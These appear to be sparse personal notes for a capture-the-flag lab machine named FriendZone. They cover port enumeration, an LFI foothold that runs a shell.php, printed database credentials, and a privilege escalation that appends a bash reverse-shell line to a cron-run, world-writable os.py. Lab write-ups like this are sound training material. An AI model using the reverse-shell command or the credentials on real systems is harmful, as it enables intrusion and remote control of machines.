Name & IP Address of Machine:
>  FriendZone  : 10.10.10.123


<!-- TOC -->

- [### Synopsis](#-synopsis)
- [### Enumeration](#-enumeration)
		- [Opened Ports:](#opened-ports)
- [### FootHold](#-foothold)
- [### Lateral Movement](#-lateral-movement)
- [### Privilege Escalation](#-privilege-escalation)

<!-- /TOC -->

### Synopsis
---
- 
### Enumeration
---
#### Opened Ports: 
- [ ] **21 (FTP)**
	- [x]  Anonymous Access Allowed ??? (NO)
- [ ] **22 (SSH)**
- [ ] **53 (DOMAIN)**
	- [x]  ZONE TRANSFER 
- [ ] **80 (HTTP)**
- [ ] ** 139 (netbios-ssn )**
- [ ] **443 (HTTPS)**
	- [ ] Any host in the certificate. 
		- friendzone.red
- [ ] **445 (SMB)**
	- [ ]  Any share with READ AND WRITE Permissions ?
### FootHold
---
- Use LFI on adminitrator1.friendzoneportal.red to execute shell /etc/Development/shell.php
```
db\_user=friend    
db\_pass=Agpyu12!0.213$  
db\_name=FZ
```

### Lateral Movement
---
### Privilege Escalation
---
- os.py is world writable and there is a cron running.
- `echo "system('bash -c \"bash -i >& /dev/tcp/10.10.14.25/9010 0>&1\"')" >> os.py`
